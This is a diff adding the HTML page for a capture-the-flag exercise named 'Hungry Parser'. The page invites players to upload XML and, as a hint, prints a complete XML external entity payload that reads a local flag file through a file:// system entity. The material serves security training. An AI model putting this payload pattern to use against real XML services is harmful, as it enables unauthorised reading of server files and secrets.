@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CTF — Hungry Parser</title>
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon" type="image/png" href="../../assets/images/logo-new.png" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../assets/css/style.css" />
+</head>
+<body class="bg-gray-900 text-white">
+  <main class="min-h-screen flex items-center justify-center p-6">
+    <div class="max-w-2xl w-full bg-gray-800/60 border border-gray-700 rounded-2xl p-8 text-center">
+    <h1 class="text-3xl font-orbitron font-bold text-cyan-300 mb-2">Hungry Parser</h1>
+  <p class="text-gray-300 mb-2">This clerk loves fetching documents you reference—no questions asked.</p>
+  <p class="text-gray-300 mb-3">Give it the right citation and it will read out whatever you point at.</p>
+      <div class="text-left bg-gray-900/60 border border-gray-700 rounded p-4 text-sm">
+        <p>Hint: Read <code>/challenge/xxe/flag.txt</code> via an external entity.</p>
+        <pre>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY xxe SYSTEM "file:///challenge/xxe/flag.txt"&gt;
+]&gt;
+&lt;note&gt;&amp;xxe;&lt;/note&gt;</pre>
+      </div>
+      <form id="f" class="mt-4">
+        <textarea id="xml" class="w-full h-48 px-3 py-2 rounded bg-gray-700 border border-gray-600" placeholder="Paste XML here..."></textarea>
+        <button class="mt-3 bg-cyan-600 px-4 py-2 rounded">Upload</button>
+      </form>
+      <pre id="out" class="mt-4 text-left bg-gray-900/60 border border-gray-700 rounded p-4 min-h-[120px]"></pre>
+    </div>
+  </main>
+  <script>
+    // Add hint toggle without changing core behavior
+    (function(){
+      const wrap=document.querySelector('.max-w-2xl');
+      const btn=document.createElement('button');
+      btn.textContent='Show Hint';
+      btn.className='mt-3 bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-sm';
+      const hint=document.createElement('p');
+      hint.id='hint';
+      hint.className='text-gray-400 text-sm mt-2 hidden';
+  hint.textContent='Define an external entity to a sensitive local path under this challenge and render it.';
+      const form=document.getElementById('f');
+      form.parentNode.insertBefore(btn, form);
+      form.parentNode.insertBefore(hint, form);
+      btn.addEventListener('click',()=>hint.classList.remove('hidden'));
+    })();
+    const f = document.getElementById('f');
+    const out = document.getElementById('out');
+    f.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      try{
+        const res = await fetch('/challenge/xxe/upload', {method:'POST', headers:{'Content-Type':'application/xml'}, body: document.getElementById('xml').value});
+        const text = await res.text();
+        out.textContent = text;
+      }catch(err){ out.textContent = 'Upload failed'; }
+    });
+  </script>
+</body>
+</html>
